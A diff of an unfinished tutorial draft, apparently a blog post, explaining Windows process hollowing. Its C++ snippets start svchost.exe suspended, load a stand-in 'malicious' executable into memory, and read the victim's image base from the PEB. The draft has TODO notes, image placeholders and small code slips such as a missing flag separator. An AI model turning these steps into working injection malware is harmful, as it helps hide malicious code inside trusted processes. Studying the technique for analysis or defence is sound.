@@ -76,16 +76,15 @@ I'm running this code in Win11 22H4, with 64-bit executables and 64-bit intel CP
 
 ### Creating the Victim Process
 
-
 As we mentioned, we are creating a new process in a `SUSPENDED` state. This will prevent this process to run, until we finish our surgery on it.
 
 ```cpp
-// 1) Prepare structures
+// Prepare structures
 LPSTARTUPINFOA victim_si = new STARTUPINFOA();
 LPPROCESS_INFORMATION victim_pi = new PROCESS_INFORMATION();
 CONTEXT ctx = {};
 
-// 2) Launch 64‑bit svchost suspended
+// Launch 64‑bit svchost suspended
 if (!CreateProcessA(
 	(LPCSTR)"C:\\Windows\\System32\\svchost.exe",
 	NULL,
@@ -103,5 +102,106 @@ if (!CreateProcessA(
 	return 1;
 }
 ```
+*Add an image here that shows the suspended process*
+### Loading Malicious File
+
+For the second step, we will read a file from the disk and load it into the memory space (memory space or virtual address space?)
+
+`CreateFileA` name can be misleading, but simply what it does opens a file from disk and return us a handle.
+
+```cpp
+HANDLE hMaliciousFile = CreateFileA(
+	(LPCSTR)"C:\\\\HelloWorld.exe",
+	GENERIC_READ
+	FILE_SHARE_READ,
+	NULL,
+	OPEN_EXISTING,
+	FILE_ATTRIBUTE_NORMAL,
+	NULL
+);
+```
+
+At this point we opened a file and got a handle for it but yet we haven't done anything with it. In order to laod it into memory first we need to allocate space for it.
+
+```cpp
+DWORD maliciousFileSize = GetFileSize(hMaliciousFile, nullptr);
+
+PVOID pMaliciousImage = VirtualAlloc(
+	NULL,
+	maliciousFileSize,
+	MEM_COMMIT | MEM_RESERVE, // learn the flags
+	PAGE_READWRITE
+);
+```
+
+*Add an image shows allocated space in HxD*
+
+Then we can write our malicious image inside the allocated memory space.
+
+```cpp
+DWORD numberOfBytesRead; // stores number of bytes read
+
+ReadFile(
+	hMaliciousFile, // handle of the malicious file 
+	pMaliciousImage, // address pointer to allocated memory
+	maliciousFileSize,
+	&numberOfBytesRead,
+	NULL
+);
+
+CloseHandle(hMaliciousFile); // no longer we need this handle
+```
+
+Again, what `ReadFile` method does is reading a file from a open handle, and write it into the given address space.
+
+*Add an image or gif shows written data into the memory* 
+
+### Carving Out the Victim Process
+
+Time for the surgery! We will unmap the victim process's address space.
+
+> TODO: explain why we unmap and just not overwrite.
+> TODO: explain the base address
+
+First of all we need to find the **base address** of the victim process. This can be tricky, because we need to look the machine registers in order to find it.
+
+Let's remember where the machine registers are stored. The **Thread Context** component of the thread!
+
+```cpp
+	ctx.ContextFlags = CONTEXT_FULL;
+	GetThreadContext(
+		victim_pi->hThread,
+		&ctx
+	);
+```
+
+`ContextFlags` determines which registers we want to get. for 32-bit systems `INTEGER` flag should be enough but in a 64-bit system we will need `Rip` and `Rdx` registers so we will use `CONTEXT_FULL` flag.
+
+If it's your first time hearing about registers, this part of the code may look weird, put a tea and calm down, for now it's just enough to know that `Rdx` register will tell us where the **base address** of the victim process.
+
+And we will talk about `Rip` later. 
+
+> [!CAUTION] I found that `Rdx` register holds the `PEB` struct for us, but I seen that many examples used different registers. I.e., for 32-bit systems it's the `Ebx` register with `0x08` offset (8 bytes) that points the **base address**. So do your research to find which register you are working with.
+
+
+
+```cpp
+PVOID pVictimImageBaseAddress;
+ReadProcessMemory(
+	victim_pi->hProcess,
+	(PVOID)(ctx.Rdx + 0x10), // Pointer to the base address. (Start reading from here)
+	&pVictimImageBaseAddress, // Store the host base address (Out the value)
+	sizeof(PVOID), // How much bytes that will be readen
+	0 // Number of bytes out
+);
+```
+`Rdx` register holds the address of the `PEB` struct which holds the **base address** variable inside of it.
+
+> TODO: explain better maybe?
+
+Why 0x10 (16 byte)? Check the `PEB` struct: https://rinseandrepeatanalysis.blogspot.com/p/peb-structure.html
+
+
+
 
 
